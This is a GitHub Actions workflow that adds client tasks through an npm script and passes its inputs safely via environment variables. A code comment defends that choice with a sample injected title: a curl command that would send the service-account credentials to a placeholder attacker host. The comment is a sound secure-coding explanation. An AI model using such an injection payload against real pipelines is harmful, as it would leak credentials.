name: Add commitment (manual)

on:
  workflow_dispatch:
    inputs:
      client:
        description: "Client name (exact or short)"
        required: true
      title:
        description: "Task title"
        required: true
      description:
        description: "Task description (optional)"
        required: false
        default: ""
      priority:
        description: "P0 | P1 | P2 | P3 | P4 | P5"
        required: false
        default: "P2"
      status:
        description: "not_started | in_progress | blocked | complete"
        required: false
        default: "not_started"
      owner_type:
        description: "bs_llc | client"
        required: false
        default: "bs_llc"
      assignee:
        description: "Internal assignee name (optional)"
        required: false
        default: ""
      due:
        description: "Due date YYYY-MM-DD (optional)"
        required: false
        default: ""
      category:
        description: "setup | ongoing"
        required: false
        default: "ongoing"
      dry_run:
        description: "Preview only"
        type: boolean
        default: false

jobs:
  add:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      # Inputs are passed through `env:`, never interpolated into the shell.
      #
      # `${{ inputs.title }}` inside a run: block is substituted as TEXT before
      # bash ever sees the script, so a title of
      #     x"; curl -d @$GOOGLE_SERVICE_ACCOUNT_JSON evil.example; #
      # runs as a command with every secret in this job's env. Going through
      # env: makes the value a shell VARIABLE, and "$TITLE" is just a string
      # however it is spelled.
      #
      # Dispatching this needs repo write access, so it is not a way IN — but
      # it is a way for one compromised collaborator session to reach the
      # service-account and database credentials, and the fix is free.
      - name: Add commitment
        env:
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
          IN_CLIENT: ${{ inputs.client }}
          IN_TITLE: ${{ inputs.title }}
          IN_DESCRIPTION: ${{ inputs.description }}
          IN_PRIORITY: ${{ inputs.priority }}
          IN_STATUS: ${{ inputs.status }}
          IN_OWNER_TYPE: ${{ inputs.owner_type }}
          IN_ASSIGNEE: ${{ inputs.assignee }}
          IN_DUE: ${{ inputs.due }}
          IN_CATEGORY: ${{ inputs.category }}
          IN_DRY_RUN: ${{ inputs.dry_run }}
        run: |
          args=()
          args+=("--client=$IN_CLIENT")
          args+=("--title=$IN_TITLE")
          [ -n "$IN_DESCRIPTION" ] && args+=("--description=$IN_DESCRIPTION")
          args+=("--priority=$IN_PRIORITY")
          args+=("--status=$IN_STATUS")
          args+=("--owner-type=$IN_OWNER_TYPE")
          [ -n "$IN_ASSIGNEE" ] && args+=("--assignee=$IN_ASSIGNEE")
          [ -n "$IN_DUE" ] && args+=("--due=$IN_DUE")
          args+=("--category=$IN_CATEGORY")
          [ "$IN_DRY_RUN" = "true" ] && args+=("--dry-run")
          npm run add-commitment -- "${args[@]}"
